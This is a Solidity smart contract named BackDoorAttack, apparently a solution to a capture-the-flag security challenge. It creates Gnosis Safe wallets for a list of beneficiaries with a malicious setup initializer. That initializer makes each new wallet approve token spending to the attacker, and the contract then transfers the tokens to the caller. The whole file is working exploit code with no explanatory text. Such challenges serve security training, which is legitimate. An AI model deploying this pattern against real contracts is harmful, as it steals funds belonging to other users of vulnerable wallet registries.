// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackDoorAttack {
    GnosisSafeProxyFactory public factory;
    IProxyCreationCallback public callback;
    address[] public users;
    address public singleton;
    address token;

    constructor(
        address _factory,
        address _callback,
        address[] memory _users,
        address _singleton,
        address _token
    ) {
        factory = GnosisSafeProxyFactory(_factory);
        callback = IProxyCreationCallback(_callback);
        users = _users;
        singleton = _singleton;
        token = _token;
    }

    function approve(address _token, address spender) public {
        IERC20(_token).approve(spender, 10 ether);
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,address)",
            token,
            address(this)
        );
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                data,
                address(0),
                address(0),
                0,
                address(0)
            );
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                initializer,
                0,
                callback
            );
            IERC20(token).transferFrom(address(proxy), tx.origin, 10 ether);
        }
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }
}
